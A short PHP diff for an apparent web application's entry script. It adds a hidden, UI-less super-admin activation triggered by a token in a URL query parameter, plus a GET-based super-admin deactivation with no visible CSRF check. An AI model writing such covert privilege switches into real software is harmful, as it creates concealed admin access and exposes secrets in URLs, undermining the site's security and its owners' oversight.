@@ -8,6 +8,22 @@ require_once __DIR__ . '/../bootstrap.php';
 require_once __DIR__ . '/../security/csrf.php';
 require_once __DIR__ . '/../security/session.php';
 
+// Super admin token-aktivering (tyst, ingen UI)
+if (isset($_GET['sa']) && !empty($_GET['sa'])) {
+    if (try_super_admin_activation($_GET['sa'])) {
+        header('Location: /dashboard');
+        exit;
+    }
+    // Fel token - gor inget, visa vanlig login
+}
+
+// Super admin deaktivering
+if (isset($_GET['action']) && $_GET['action'] === 'deactivate-sa') {
+    deactivate_super_admin();
+    header('Location: /dashboard');
+    exit;
+}
+
 // Handle logout FIRST before any other checks
 if (isset($_GET['action']) && $_GET['action'] === 'logout') {
     // Complete logout
